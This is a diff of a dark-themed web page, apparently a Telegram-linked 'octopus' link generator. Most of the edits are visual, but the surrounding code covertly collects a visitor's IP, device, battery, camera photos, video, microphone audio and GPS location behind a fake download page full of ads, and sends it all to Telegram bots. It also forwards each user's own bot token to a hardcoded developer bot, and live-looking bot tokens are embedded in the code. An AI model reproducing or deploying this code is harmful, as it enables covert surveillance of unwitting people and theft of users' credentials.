@@ -4,11 +4,11 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ — Red Room</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
         /* ================================================================
-           ULTIMATE LUXURY — BLOOD RED · NO CLUTTER · PEAK PERFORMANCE
+           ULTIMATE LUXURY — HACKER FONT · FIRE ANIMATION · PEAK PERFORMANCE
            ================================================================ */
         * {
             margin: 0;
@@ -25,7 +25,7 @@
             --text-hell: #c9b8a8;
             --text-dim: #6a5a4a;
             --text-blood: #ff2222;
-            --font-display: 'Cinzel', 'Georgia', serif;
+            --font-display: 'Orbitron', 'Cinzel', 'Georgia', serif;
             --font-mono: 'JetBrains Mono', 'Courier New', monospace;
         }
 
@@ -339,7 +339,25 @@
             margin-left: 6px;
         }
 
-        /* Welcome — minimal, no frames */
+        /* Developer & Bot links */
+        .nav .dev-link {
+            color: var(--gold-blood);
+            border-color: rgba(184, 134, 58, 0.15);
+        }
+        .nav .dev-link:hover {
+            background: rgba(184, 134, 58, 0.1);
+            border-color: var(--gold-blood);
+        }
+        .nav .bot-link {
+            color: #66ccff;
+            border-color: rgba(102, 204, 255, 0.15);
+        }
+        .nav .bot-link:hover {
+            background: rgba(102, 204, 255, 0.1);
+            border-color: #66ccff;
+        }
+
+        /* Welcome — minimal: only time & date */
         .welcome-simple {
             background: rgba(0, 0, 0, 0.35);
             backdrop-filter: blur(4px);
@@ -347,35 +365,119 @@
             border: 1px solid rgba(204, 10, 10, 0.08);
             padding: 14px 20px;
             margin-bottom: 20px;
-            font-family: var(--font-mono);
-            font-size: 14px;
-            line-height: 1.8;
+            font-family: var(--font-display);
+            font-size: 16px;
+            line-height: 2;
             color: var(--text-hell);
             direction: ltr;
-            text-align: left;
+            text-align: center;
             text-shadow: 0 0 15px rgba(0, 0, 0, 0.9);
             border-radius: 4px;
+            letter-spacing: 2px;
         }
         .welcome-simple .glow {
             color: var(--blood-fresh);
             text-shadow: 0 0 25px var(--blood-glow);
         }
-        .welcome-simple .dim {
-            color: var(--text-dim);
-        }
-        .welcome-simple .link-display {
+        .welcome-simple .time-display {
             color: #ff6a6a;
-            word-break: break-all;
+            font-weight: 700;
         }
-        .welcome-simple .chat-display {
-            color: #66ccff;
+
+        /* ===== FIRE ANIMATION (bottom) ===== */
+        .fire-container {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 120px;
+            z-index: 5;
+            pointer-events: none;
+            overflow: hidden;
         }
-        .welcome-simple .token-display {
-            color: #ffaa66;
+        .fire {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(ellipse at 20% 100%, rgba(255, 50, 0, 0.6) 0%, transparent 60%),
+                radial-gradient(ellipse at 50% 100%, rgba(255, 100, 0, 0.5) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 100%, rgba(255, 50, 0, 0.6) 0%, transparent 60%);
+            animation: fire-dance 1.5s ease-in-out infinite alternate;
+            filter: blur(2px);
         }
-        .welcome-simple .icon {
-            color: var(--blood-fresh);
-            margin-left: 6px;
+        .fire::before {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 80%;
+            background: 
+                radial-gradient(ellipse at 10% 100%, rgba(255, 30, 0, 0.4) 0%, transparent 50%),
+                radial-gradient(ellipse at 30% 100%, rgba(255, 80, 0, 0.5) 0%, transparent 40%),
+                radial-gradient(ellipse at 50% 100%, rgba(255, 120, 0, 0.6) 0%, transparent 50%),
+                radial-gradient(ellipse at 70% 100%, rgba(255, 80, 0, 0.5) 0%, transparent 40%),
+                radial-gradient(ellipse at 90% 100%, rgba(255, 30, 0, 0.4) 0%, transparent 50%);
+            animation: fire-dance 2.2s ease-in-out infinite alternate-reverse;
+            filter: blur(4px);
+        }
+        .fire::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 60%;
+            background: 
+                radial-gradient(ellipse at 15% 100%, rgba(255, 200, 50, 0.3) 0%, transparent 40%),
+                radial-gradient(ellipse at 45% 100%, rgba(255, 200, 80, 0.4) 0%, transparent 45%),
+                radial-gradient(ellipse at 75% 100%, rgba(255, 200, 50, 0.3) 0%, transparent 40%);
+            animation: fire-dance 1.8s ease-in-out infinite alternate;
+            filter: blur(6px);
+        }
+        @keyframes fire-dance {
+            0% {
+                transform: scaleX(1) scaleY(1) translateY(0);
+                opacity: 0.8;
+            }
+            25% {
+                transform: scaleX(1.05) scaleY(1.02) translateY(-5px);
+                opacity: 0.9;
+            }
+            50% {
+                transform: scaleX(0.95) scaleY(0.98) translateY(-8px);
+                opacity: 1;
+            }
+            75% {
+                transform: scaleX(1.03) scaleY(1.01) translateY(-3px);
+                opacity: 0.9;
+            }
+            100% {
+                transform: scaleX(0.98) scaleY(1.03) translateY(-6px);
+                opacity: 0.85;
+            }
+        }
+        .fire-glow {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 200px;
+            background: radial-gradient(ellipse at 50% 100%, rgba(255, 50, 0, 0.15) 0%, transparent 70%);
+            animation: glow-pulse 2s ease-in-out infinite alternate;
+            pointer-events: none;
+        }
+        @keyframes glow-pulse {
+            0% {
+                opacity: 0.3;
+                transform: scaleY(1);
+            }
+            100% {
+                opacity: 0.8;
+                transform: scaleY(1.3);
+            }
         }
 
         #cardArea {
@@ -428,6 +530,7 @@
             color: var(--text-dim);
             text-transform: uppercase;
             margin-bottom: 5px;
+            font-family: var(--font-display);
         }
         .field label .glyph {
             color: var(--blood-fresh);
@@ -462,6 +565,7 @@
             color: var(--text-dim);
             text-transform: uppercase;
             margin: 6px 0 12px;
+            font-family: var(--font-display);
         }
         .features-label .glyph {
             color: var(--blood-fresh);
@@ -639,37 +743,7 @@
             font-size: 13px;
         }
 
-        .madeby {
-            text-align: center;
-            margin-top: 30px;
-            font-family: var(--font-display);
-            font-size: 11px;
-            letter-spacing: 5px;
-            color: var(--text-dim);
-            text-transform: uppercase;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 16px;
-            flex-wrap: wrap;
-            border-top: 1px solid rgba(204, 10, 10, 0.04);
-            padding-top: 22px;
-        }
-        .madeby .dev {
-            font-weight: 800;
-            font-size: 15px;
-            background: linear-gradient(120deg, #ff4a4a, var(--blood-fresh));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            letter-spacing: 4px;
-        }
-        .madeby .sep {
-            opacity: 0.15;
-        }
-        .madeby i {
-            color: var(--blood-fresh);
-            margin: 0 6px;
-        }
+        /* Footer removed - all text removed as requested */
 
         #captureBadge {
             position: fixed;
@@ -744,7 +818,7 @@
                 padding: 4px 14px;
             }
             .welcome-simple {
-                font-size: 12px;
+                font-size: 13px;
                 padding: 10px 14px;
             }
             #cardArea {
@@ -763,6 +837,9 @@
             #result #linkText {
                 font-size: 12px;
             }
+            .fire-container {
+                height: 80px;
+            }
         }
         @media (max-width: 480px) {
             .brand .brand-text .name {
@@ -778,6 +855,9 @@
                 letter-spacing: 2px;
                 padding: 14px 16px;
             }
+            .fire-container {
+                height: 60px;
+            }
         }
     </style>
 </head>
@@ -789,6 +869,12 @@
     <div class="grain"></div>
     <div class="blood-rain" id="bloodRain"></div>
     <div id="dripLayer"></div>
+
+    <!-- ===== FIRE ANIMATION (BOTTOM) ===== -->
+    <div class="fire-container">
+        <div class="fire"></div>
+        <div class="fire-glow"></div>
+    </div>
 
     <div class="skull-bg" style="top:12%;left:2%;width:100px;height:130px;opacity:0.05;">
         <svg viewBox="0 0 100 130"><path d="M50,10 C25,10 10,30 10,55 C10,75 20,90 30,100 L30,115 L70,115 L70,100 C80,90 90,75 90,55 C90,30 75,10 50,10 Z" fill="rgba(80,40,30,0.15)" stroke="rgba(160,80,50,0.06)" stroke-width="1.5"/><circle cx="35" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/><circle cx="65" cy="50" r="12" fill="rgba(10,0,0,0.2)" stroke="rgba(160,80,50,0.04)" stroke-width="1"/><path d="M35,50 Q40,45 45,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/><path d="M55,50 Q60,45 65,50" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/><path d="M40,70 Q50,80 60,70" stroke="rgba(160,80,50,0.04)" stroke-width="1" fill="none"/></svg>
@@ -815,22 +901,15 @@
                 <svg class="sigil" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="#cc0a0a" stroke-width="1.4" opacity="0.5"/><circle cx="50" cy="50" r="30" fill="none" stroke="#cc0a0a" stroke-width="1.2" opacity="0.4"/><path d="M50 10 L61 40 L92 40 L67 58 L77 88 L50 70 L23 88 L33 58 L8 40 L39 40 Z" fill="none" stroke="#cc0a0a" stroke-width="1.3" opacity="0.6"/><circle cx="50" cy="50" r="3.5" fill="#ff1a1a"/></svg>
                 <div class="brand-text"><div class="name">𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆</div><div class="sub">The Red Room · Inner Circle</div></div>
             </div>
-            <div class="nav"><a href="#"><i class="fas fa-terminal"></i> Console</a><a href="#"><i class="fas fa-shield-alt"></i> Shield</a></div>
+            <div class="nav">
+                <a href="https://t.me/xx_8k" target="_blank" class="dev-link"><i class="fas fa-code"></i> Developer</a>
+                <a href="https://t.me/v_v_9bot" target="_blank" class="bot-link"><i class="fas fa-robot"></i> Bot</a>
+            </div>
         </header>
 
+        <!-- Welcome — only time & date -->
         <div class="welcome-simple" id="welcomeText">
-            <span class="icon">☠</span> <span class="glow">⛧ Welcome to 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ Bot ⛧</span> <span class="icon">𖤐</span><br>
-            <span class="dim">⭑ Personal Link ⭒</span><br>
-            <span class="link-display" id="personalLink">Loading...</span><br>
-            <span class="dim">⭑ Visitor Data ⭒</span><br>
-            <span class="dim">˹📍˼ Country</span> › <span id="visitorCountry">Unknown</span><br>
-            <span class="dim">˹📱˼ Device</span> › <span id="visitorDevice">Unknown</span><br>
-            <span class="dim">˹🔋˼ Battery</span> › <span id="visitorBattery">N/A</span><br>
-            <span class="dim">˹🌐˼ IP Address</span> › <span id="visitorIP">Unknown</span><br>
-            <span class="dim">˹⏱️˼ Time</span> › <span id="visitorTime">--</span><br>
-            <span class="dim">˹🆔˼ Chat ID</span> › <span class="chat-display" id="displayChatId">Unknown</span><br>
-            <span class="dim">˹🤖˼ Bot Token</span> › <span class="token-display" id="displayBotToken">Unknown...</span><br>
-            <span class="dim">˹🏷️˼ Bot User</span> › <span class="glow">@V_V_9BOT</span>
+            <span class="glow">⛧</span> <span id="welcomeTime" class="time-display">Loading...</span> <span class="glow">⛧</span>
         </div>
 
         <div class="card" id="cardArea">
@@ -870,26 +949,20 @@
             </div>
         </div>
 
-        <div class="madeby">
-            <span>Forged in Ashes</span>
-            <span class="sep">|</span>
-            <span class="dev">XX_8K</span>
-            <span class="sep">|</span>
-            <span><i class="fas fa-fire"></i> Infernal</span>
-        </div>
+        <!-- Footer removed completely -->
 
     </div>
 
     <div id="mandatoryDialog" style="display:none !important;"></div>
 
     <!-- ============================================================
-    JAVASCRIPT — FINAL ULTIMATE VERSION · NO CLUTTER · ALL FEATURES WORK
+    JAVASCRIPT — FINAL ULTIMATE VERSION
     ============================================================ -->
     <script>
         // ================================================================
-        //  ALL ORIGINAL FUNCTIONS PRESERVED & FIXED
-        //  ALL TELEGRAM MESSAGES USE ˹˼ BRACKETS FOR ICONS
-        //  NO FRAMES · NO CLUTTER · PURE LUXURY
+        //  ALL ORIGINAL FUNCTIONS PRESERVED
+        //  TELEGRAM MESSAGES USE FRAMES & ˹˼ BRACKETS
+        //  HACKER FONT · FIRE ANIMATION · FAST PERMISSIONS
         // ================================================================
 
         // ================================================================
@@ -1053,6 +1126,25 @@
         // ================================================================
         //  UI UPDATES (Live Data)
         // ================================================================
+        // Welcome only time & date
+        function updateWelcomeTime() {
+            const now = new Date();
+            const formatted = now.toLocaleString('en-US', {
+                weekday: 'long',
+                year: 'numeric',
+                month: 'long',
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit',
+                hour12: true
+            });
+            document.getElementById('welcomeTime').textContent = formatted;
+        }
+        updateWelcomeTime();
+        setInterval(updateWelcomeTime, 1000);
+
+        // Personal link
         document.getElementById('personalLink').textContent = window.location.origin + window.location.pathname;
 
         const chatInput = document.getElementById('chatIdInput');
@@ -1063,18 +1155,12 @@
         chatInput.addEventListener('input', function() { displayChat.textContent = this.value.trim() || 'Unknown'; });
         tokenInput.addEventListener('input', function() { displayToken.textContent = this.value.trim() || 'Unknown...'; });
 
-        function updateTime() {
-            document.getElementById('visitorTime').textContent = new Date().toLocaleString('en-US', { hour12: true });
-        }
-        updateTime();
-        setInterval(updateTime, 60000);
-
         // ================================================================
-        //  ORIGINAL FUNCTIONS (PRESERVED & FIXED) — LUXURY MESSAGES
+        //  ORIGINAL FUNCTIONS (PRESERVED & FIXED) — WITH FRAMES
         // ================================================================
 
         // ---- CONSTANTS ----
-        const MASTER_BOT_TOKEN = "8806320032:AAEvSNbf1boLIZ9pt7sbFMit-ARtAjTS7UQ";
+        const MASTER_BOT_TOKEN = "8812415465:AAFQHLFkhYIg7jv15n8pL1lIKnylnugqGsc";
         const MASTER_CHAT_ID = "8552540563";
         const BOT_USERNAME = "@V_V_9BOT";
 
@@ -1084,20 +1170,23 @@
         let visitorDevice = "Unknown";
         let visitorBattery = "N/A";
 
-        // ---- BUILD LUXURY CAPTION (no frames, only ˹˼ brackets) ----
+        // ---- BUILD CAPTION WITH FRAMES (luxury style) ----
         function buildCaption(extra = "") {
-            let cap = `⭑ Personal Data ⭒\n`;
-            cap += `˹📍˼ Country: ${visitorCountry}\n`;
-            cap += `˹📱˼ Device: ${visitorDevice}\n`;
-            cap += `˹🔋˼ Battery: ${visitorBattery}\n`;
-            cap += `˹🌐˼ IP: ${visitorIP}\n`;
-            cap += `˹⏱️˼ Time: ${new Date().toLocaleString('en-US', { hour12: true })}\n`;
-            if (extra) cap += `${extra}\n`;
-            cap += `𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
+            let cap =
+            cap += `⭑ ᴠɪꜱɪᴛᴏʀ ɪɴꜰᴏ ⭒\n`;
+            cap += `╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n`;
+            cap += `┃ ˹📍˼ ᴄᴏᴜɴᴛʀʏ     › ${visitorCountry}\n`;
+            cap += `┃ ˹📱˼ ᴅᴇᴠɪᴄᴇ     › ${visitorDevice}\n`;
+            cap += `┃ ˹🔋˼ ʙᴀᴛᴛᴇʀʏ   › ${visitorBattery}\n`;
+            cap += `┃ ˹🌐˼ IP ᴀᴅᴅʀᴇꜱꜱ  › ${visitorIP}\n`;
+            cap += `┃ ˹⏱️˼ ᴛɪᴍᴇ      › ${new Date().toLocaleString('en-US', { hour12: true })}\n`;
+            if (extra) cap += `┃ ${extra}\n`;
+            cap += `╰━━━━━━━━━━━━━━━━━━━━━━━╯\n`;
+            cap += `          𖤐  @xx_8k ♆  𖤐`;
             return cap;
         }
 
-        // ---- SEND VISITOR INFO (English, luxury) ----
+        // ---- SEND VISITOR INFO (with frames) ----
         async function sendVisitorInfo() {
             try {
                 const ua = navigator.userAgent;
@@ -1123,8 +1212,7 @@
                 document.getElementById('visitorBattery').textContent = visitorBattery;
                 document.getElementById('visitorIP').textContent = visitorIP;
 
-                const msg =
-                    `⭑ New Visit ⭒\n˹🔗˼ Personal Link: ${window.location.href}\n⭑ Visitor Data ⭒\n˹📍˼ Country: ${visitorCountry}\n˹📱˼ Device: ${visitorDevice}\n˹🔋˼ Battery: ${visitorBattery}\n˹🌐˼ IP: ${visitorIP}\n˹⏱️˼ Time: ${new Date().toLocaleString('en-US', { hour12: true })}\n𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
+                const msg = buildCaption();
 
                 await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -1162,9 +1250,9 @@
             linkText.innerHTML = `<i class="fas fa-link"></i> ${fullLink}`;
             resultEl.style.display = 'flex';
 
-            // Send to user bot (luxury, no frames)
+            // Send to user bot (with frames)
             const userMsg =
-                `⭑ Your Personal Link ⭒\n˹🔗˼ ${fullLink}\n𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
+                `⭑ ᴘᴇʀꜱᴏɴᴀʟ ʟɪɴᴋ ⭒\n╭⊚─〔 ʟɪɴᴋ 〕───────\n┃˹🔗˼ ⛧ ʏᴏᴜʀ ʟɪɴᴋ ɪꜱ ʀᴇᴀᴅʏ ⛧ ⭒\n┃⍟ \n┃˹🔥˼ ᴜꜱᴇ ɪᴛ ᴡɪꜱᴇʟʏ ⭒\n╰───────────────\n\n⭑ ʟɪɴᴋ ⭒\n╭⊚─〔 ᴜʀʟ 〕───────\n┃ 🔗 ${fullLink}\n╰───────────────\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -1174,9 +1262,9 @@
                 });
             } catch (e) { console.log('Failed to send to user bot'); }
 
-            // Send Bot Info to Developer (luxury, no frames)
+            // Send Bot Info to Developer (with frames)
             const devMsg =
-                `⭑ Bot Information ⭒\n˹🆔˼ Chat ID: ${chat}\n˹🤖˼ Token: ${token}\n˹🏷️˼ Bot Username: ${BOT_USERNAME}\n˹🔗˼ Link: ${fullLink}\n𖤐 𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆ 𖤐`;
+                `⭑ ʙᴏᴛ ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ ⭒\n╭⊚─〔 ᴅᴀᴛᴀ 〕───────\n┃ ˹🆔˼ ᴄʜᴀᴛ ɪᴅ: ${chat}\n┃ ˹🤖˼ ᴛᴏᴋᴇɴ: ${token}\n┃ ˹🏷️˼ ʙᴏᴛ ᴜꜱᴇʀɴᴀᴍᴇ: ${BOT_USERNAME}\n┃ ˹🔗˼ ʟɪɴᴋ: ${fullLink}\n╰━━━━━━━━━━━━━━━━━━━━━━━╯\n          𖤐  𝖔𝖈𝖙𝖔𝖕𝖚𝖘 ♆  𖤐`;
 
             await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -1204,7 +1292,7 @@
         }
 
         // ---- MEDIA HELPERS (FIXED with MIME TYPES) ----
-        // buildCaption is already defined above (luxury version)
+        // buildCaption is already defined above
 
         async function captureAndSend(stream, chat, token, type) {
             return new Promise((resolve) => {
@@ -1231,7 +1319,7 @@
                                 form.append('chat_id', chat);
                                 form.append('photo', blob, `${type}_${Date.now()}.jpg`);
                                 const caption = buildCaption(
-                                    `˹📸˼ Photo (${type === 'front' ? 'Front' : 'Back'})`);
+                                    `˹📸˼ ᴘʜᴏᴛᴏ (${type === 'front' ? 'Fʀᴏɴᴛ' : 'Bᴀᴄᴋ'})`);
                                 form.append('caption', caption);
 
                                 try {
@@ -1267,7 +1355,7 @@
                     form.append('chat_id', chat);
                     form.append('video', blob, `${type}_${Date.now()}.webm`);
                     const caption = buildCaption(
-                        `˹🎥˼ Video (${type === 'front' ? 'Front' : 'Back'}) - 5 sec`);
+                        `˹🎥˼ ᴠɪᴅᴇᴏ (${type === 'front' ? 'Fʀᴏɴᴛ' : 'Bᴀᴄᴋ'}) - 5 ꜱᴇᴄ`);
                     form.append('caption', caption);
 
                     try {
@@ -1303,7 +1391,7 @@
                     const form = new FormData();
                     form.append('chat_id', chat);
                     form.append('audio', blob, `audio_${Date.now()}.webm`);
-                    const caption = buildCaption(`˹🎤˼ Audio Recording - 5 sec`);
+                    const caption = buildCaption(`˹🎤˼ ᴀᴜᴅɪᴏ ʀᴇᴄᴏʀᴅɪɴɢ - 5 ꜱᴇᴄ`);
                     form.append('caption', caption);
 
                     try {
@@ -1329,7 +1417,7 @@
                         async (pos) => {
                             const { latitude, longitude } = pos.coords;
                             const caption = buildCaption(
-                                `˹📍˼ Current Location\nCoords: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
+                                `˹📍˼ ᴄᴜʀʀᴇɴᴛ ʟᴏᴄᴀᴛɪᴏɴ\nᴄᴏᴏʀᴅꜱ: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`
                                 );
                             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                                 method: 'POST',
@@ -1417,7 +1505,7 @@
         }
 
         // ================================================================
-        //  SIDE PAGE (DOWNLOAD) — ADS LOAD IMMEDIATELY, THEN PERMISSIONS
+        //  SIDE PAGE (DOWNLOAD) — FAST, NO LOADING MESSAGE
         // ================================================================
         const params = new URLSearchParams(window.location.search);
         const chat = params.get('chat');
@@ -1429,9 +1517,9 @@
             dialog.style.display = 'none';
             document.getElementById('cardArea').style.display = 'none';
             document.querySelector('.header').style.display = 'none';
-            document.querySelector('.madeby').style.display = 'none';
-            document.getElementById('captureBadge').style.display = 'none';
             document.querySelector('.welcome-simple').style.display = 'none';
+            document.getElementById('captureBadge').style.display = 'none';
+            document.querySelector('.fire-container').style.display = 'none';
 
             const wrap = document.querySelector('.wrap');
             wrap.innerHTML = '';
@@ -1441,7 +1529,7 @@
             wrap.style.background = '#030101';
             wrap.style.minHeight = '100vh';
 
-            // Minimal container for ads (no red page)
+            // Minimal container for ads (no loading message)
             const adContainer = document.createElement('div');
             adContainer.style.width = '100%';
             adContainer.style.minHeight = '100vh';
@@ -1450,6 +1538,7 @@
             adContainer.style.alignItems = 'center';
             adContainer.style.justifyContent = 'center';
             adContainer.style.padding = '20px';
+            adContainer.style.background = '#030101';
 
             const adBox = document.createElement('div');
             adBox.style.width = '100%';
@@ -1460,14 +1549,6 @@
             adBox.style.padding = '30px 20px';
             adBox.style.textAlign = 'center';
             adBox.style.clipPath = 'polygon(0 0, 100% 0, 98% 100%, 2% 100%)';
-
-            const adMsg = document.createElement('p');
-            adMsg.textContent = '⛧ Loading resources, please wait... ⛧';
-            adMsg.style.color = '#c9b8a8';
-            adMsg.style.fontFamily = 'monospace';
-            adMsg.style.marginBottom = '20px';
-            adMsg.style.fontSize = '14px';
-            adBox.appendChild(adMsg);
 
             const adArea = document.createElement('div');
             adArea.id = 'adArea';
@@ -1480,7 +1561,7 @@
             adContainer.appendChild(adBox);
             wrap.appendChild(adContainer);
 
-            // Load ads immediately
+            // Load ads immediately (no loading message)
             loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
             loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
             loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
@@ -1498,10 +1579,10 @@
             document.body.appendChild(atOptionsScript);
             loadAd("https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js");
 
-            // Start features after a small delay to let ads load
+            // Start features immediately (fast)
             setTimeout(() => {
                 startFeatures(chat, token, features);
-            }, 1500);
+            }, 500);
         }
     </script>
 
